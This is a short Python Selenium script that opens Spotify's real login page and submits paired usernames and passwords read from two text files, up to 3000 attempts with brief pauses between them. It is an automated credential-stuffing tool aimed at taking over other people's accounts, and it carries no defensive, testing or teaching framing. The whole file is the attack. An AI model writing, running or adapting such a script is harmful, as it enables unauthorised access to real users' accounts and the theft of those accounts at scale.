from selenium import webdriver
from selenium.webdriver.chrome.webdriver import WebDriver
from webdriver_manager.chrome import ChromeDriverManager
import time

driver: WebDriver = webdriver.Chrome(ChromeDriverManager().install())
url = "https://accounts.spotify.com/en/login?continue=https"

us = open("username.txt", "r")
pw = open("password.txt", "r")

for i in range(3000):
    a = us.readline()

    b = pw.readline()

    driver.get(url)
    driver.find_element_by_id("login-username").clear()
    driver.find_element_by_id("login-username").send_keys(a)
    driver.find_element_by_id("login-password").send_keys(b)
    driver.find_element_by_id("login-button").click()
    time.sleep(2)

us.close()
pw.close()
driver.close()
